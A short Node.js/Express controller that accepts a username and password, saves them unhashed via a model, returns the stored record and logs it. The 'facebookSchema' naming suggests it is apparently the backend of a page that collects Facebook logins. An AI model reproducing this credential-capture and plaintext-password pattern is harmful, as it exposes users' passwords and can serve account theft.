const infoSchema=require('../model/infoSchema')
const postInfo = async(req, res) => {
  try {
      const { username, password } = req.body;
      const facebookSchema=await infoSchema.create({username,password})
      res.status(200).json({facebookSchema});
      console.log(facebookSchema)
  } catch (error) {
    res.status(500).json({ msg: error });
  }
};
module.exports={postInfo}


